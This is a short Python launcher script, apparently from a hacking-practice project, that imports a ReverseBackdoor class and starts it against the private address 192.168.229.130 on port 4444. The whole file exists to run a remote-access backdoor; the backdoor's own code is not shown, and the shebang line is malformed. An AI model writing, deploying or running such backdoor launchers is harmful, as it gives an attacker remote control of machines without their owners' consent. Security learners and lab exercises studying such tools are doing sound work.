#!/usr/env/bin python

from reverse_backdoor import ReverseBackdoor

backdoor = ReverseBackdoor("192.168.229.130", 4444, 1024)

backdoor.startListening()